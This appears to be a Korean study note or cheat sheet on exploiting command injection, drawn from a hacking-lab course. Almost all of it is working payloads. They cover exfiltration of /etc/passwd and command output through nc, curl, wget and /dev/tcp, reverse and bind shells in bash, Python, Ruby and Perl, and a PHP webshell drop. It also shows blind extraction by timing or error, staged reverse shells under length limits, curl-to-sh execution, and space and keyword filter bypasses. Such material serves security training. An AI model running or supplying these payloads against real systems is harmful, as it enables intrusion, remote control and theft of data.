## 실행 결과를 확인할 수 없는 환경 - I
네트워크의 인/아웃 바운드의 제한이 없을 때 사용할 수 있는 방법
```sh
cat /etc/password | nc 127.0.0.1 8000

cat /etc/password | telnet 127.0.0.1 8000

# 디렉토리 목록 결과를 base64 인코딩하여 실행결과를 네트어크로 전송하는 예시
curl "http://127.0.0.1:8080/?$(ls -al|base64 -w0)"

# POST method로 전송하기
curl http://127.0.0.1:8080/ -d "$(ls -al)"
wget http://127.0.0.1:8080 --method=POST --body-date="`ls -al`"

#/dev/tcp & /dev/udp
#  "/dev/tcp" 장치 경로의 하위 디렉터리로 IP 주소와 포트 번호를 입력하면 Bash는 해당 경로로 네트워크 연결을 시도
cat /etc/password > /dev/tcp/127.0.0.1/8080
```

### Reverse Shell
공격 대상 서버에서 공격자의 서버로 셸을 연결. 공격자 서버에서 쉘을 획득하여 명령 실행 가능
- 공격 대상 서버
    ```sh
        /bin/sh -i >& /dev/tcp/127.0.0.1/8080 0>&1
        /bin/sh -i >& /dev/udp/127.0.0.1/8080 0>&1
        # /bin/sh -i: 대화형(interactive) 쉘을 시작
        # 0>&1 stdin을 stdout으로 Redirect
    ```
- 공격자 서버
  ```sh
    $ nc -l -p 8080 -k -v
    Connection from [127.0.0.1] port 8080 [tcp/http-alt] accepted (family 2, sport 42202)
    $ id
    uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)
  ```
- 파이썬 이용한 리버스쉘
  ```
  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
  ```
- 루비 이용한 리버스쉘
  ```
  ruby -rsocket -e 'exit if fork;c=TCPSocket.new("127.0.0.1","8080");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
  ```
- 여러가지 언어의 리버스쉘 : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

### Bind Shell
공격 대상 서버에서 특정 포트를 열어 셸을 서비스하는 것을 의미
- nc는 버전에 따라 특정 포트에 임의 서비스를 등록할 수 있도록 "-e" 옵션을 제공
    ```sh
      nc -nlvp 8080 -e /bin/sh
      ncat -nlvp 8080 -e /bin/sh
    ```
- 펄 사용
 ```
 perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
 ```

### 파일 생성
- Script Engine
  - 커맨드 인젝션 취약점이 발생하고, 웹 서버가 지정한 경로를 알고 있다면 해당 위치에 셸을 실행하는 웹셸(Webshell) 파일을 업로드하고, 해당 페이지에 접속해 셸을 실행하고 실행 결과를 확인
    ```
    printf '<?=system($_GET[0])?>' > /var/www/html/uploads/shell.php 
    ```
- Static File Directory
  - 파이썬 프레임워크 기본설정은 static으로 이 디렉토리 및 파일 생성, 권한 없으면 불가능
  ```
  mkdir static; id > static/result.txt
  ```

## 실행 결과를 확인할 수 없는 환경 - II
네트워크 방화벽 규칙을 설정해 인/아웃 바운드에 제한이 걸려 있는 경우 참/거짓 비교문으로 데이터 알아내야 함
- 지연 시간(sleep): 참일 경우 지연시간 발생
```sh
# id 명령어의 실행 결과를 base64로 인코딩. 나온 값을 한 바이트씩 비교하는 스크립트를 작성
$ id 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ id | base64 -w 0
dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
 
bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then sleep 2; fi;" # --> sleep for 2 seconds; true
bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then sleep 2; fi;" # --> sleep for 2 seconds; true
bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then sleep 2; fi;" # --> sleep for 0 seconds; false
bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then sleep 2; fi;" # --> sleep for 2 seconds; true
```
- 에러(Dos) - 참일 경우 시스템 에러 발생. Internal Server Error (HTTP 500) 반환
  - 시간을 지연시키는 방법이 어려운 경우 메모리를 많이 소모하는 명령어를 입력하는 등의 행위로 Internal Server Error 발생 시킴
  - 메모리를 소모하는 방법은 다양하지만, 제일 간단한 방법으로는 cat /dev/urandom 명령어를 실행
  ```sh
    bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then cat /dev/urandom; fi;" # --> 500 true
    bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then cat /dev/urandom; fi;" # --> 500 true
    bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then cat /dev/urandom; fi;" # --> 200 false
    bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then cat /dev/urandom; fi;" # --> 500 true

    2020/05/27 09:46:14 [error] 1572#1572: *297 FastCGI sent in stderr: "PHP message: PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 98566176 bytes) in /var/www/html/x.php on line 6" while reading response header from upstream, client: 183.98.35.161, server: demo.dreamhack.io, request: "GET /m.php?cmd=bash%20-c%20%22printenv;a=\$(id%20|%20base64%20-w%200);%20if%20[%20\${a:0:1}%20==%20%27z%27%20];%20then%20sleep%202;%20fi;%22;%20echo%201;cat%20/dev/urandom HTTP/1.1", upstream: "fastcgi://unix:/var/run/php/php7.2-fpm.sock:", host: "demo.dreamhack.io" 
  ```

### 입력값의 길이가 제한된 환경
입력 길이가 제한된 상황에서 셸의 기능인 리다이렉션 (Redirection)을 이용해 임의 디렉터리에 파일을 생성하고, Bash 또는 파이썬과 같은 인터프리터를 이용해 실행
- "/tmp" 디렉터리는 누구나 읽고 쓸 수 있는 권한이 존재하기 때문에 해당 위치에 "1"이라는 파일을 생성
- "bash</dev/tcp/127.0.0.1/1234" 문자열을 삽입합니다. 이후 "bash</tmp/1&" 명령어를 실행하면 앞서 생성한 파일을 Bash를 통해 실행
```sh
printf bas>/tmp/1
printf h>>/tmp/1
printf \<>>/tmp/1
printf /d>>/tmp/1
printf ev>>/tmp/1
printf /t>>/tmp/1
printf cp>>/tmp/1
printf />>/tmp/1
printf 1 >>/tmp/1
printf 2 >>/tmp/1
printf 7.>>/tmp/1
printf 0.>>/tmp/1
printf 0.>>/tmp/1
printf 1/>>/tmp/1
printf 1 >>/tmp/1
printf 2 >>/tmp/1
printf 3 >>/tmp/1
printf 4 >>/tmp/1
bash</tmp/1& 
```
- IP 주소의 길이를 짧게 하기 위한 방법으로는 짧은 길이의 도메인을 사용하거나, IP 형식을 long 자료형 형식으로 변환하는 것
  ```py
  #!/usr/bin/python3
    import ipaddress
    int(ipaddress.IPv4Address("192.168.0.13")) # 3232235533
  ```
- 공격 예시
  - 네트워크 도구를 이용한 리버스 셸 공격이 가능합니다. curl 또는 wget은 앞서 변환된 long 형식의 IP 주소를 해석합니다. 공격 대상 서버에서 curl을 통해 공격자 웹 서버에 리버스 셸을 실행하는 스크립트를 받아오고, 이를 실행하면 셸을 획득
  - 공격자 웹 서버에 리버스 셸을 실행하는 스크립트를 미리 업로드
  ```
    python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("127.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);' 
  ```
  - 서버에서 curl을 실행하되, 공격자 서버의 IP를 long 형식으로 변환한 값을 인자로 전달합니다.
  - 두 과정을 모두 마치면, 공격자 서버에서 미리 열어둔 포트에서 공격 대상 서버에 명령어를 전송할 수 있음
  ```sh
  curl 2130706433|sh$(curl 2130706433)`curl 2130706433`
  ```

### 입력 값이 제한된 환경
입력 값에 특수 문자를 삽입하지 못할 경우 셸에서 제공하는 기능이나 환경 변수를 이용해 우회
- 공백 문자 우회
  ```sh
    cat${IFS}/etc/passwd
    cat$IFS/etc/passwd
    X=$'\x20';cat${X}/etc/passwd
    X=$'\040';cat${X}/etc/passwd
    {cat,/etc/passwd}
    cat</etc/passwd

    # IFS는 환경변수로, 문자열을 나눌 때 기준이 되는 문자를 정의합니다. 
    #  기본 값은 공백, 탭, 개행 순이기 때문에 Command Injection에서 공백을 우회하는데 자주 사용
```
- 키워드 필터링 우회
    ```sh
    /bin/c?t /etc/passwd
    /bin/ca* /etc/passwd
    c''a""t /etc/passwd
    \c\a\t /etc/passwd
    c${invalid_variable}a${XX}t /etc/passwd

    echo -e "\x69\x64" | sh
    echo $'\151\144'| sh
    X=$'\x69\x64'; sh -c $X

    cat `xxd -r -p <<< 2f6574632f706173737764`
    ```
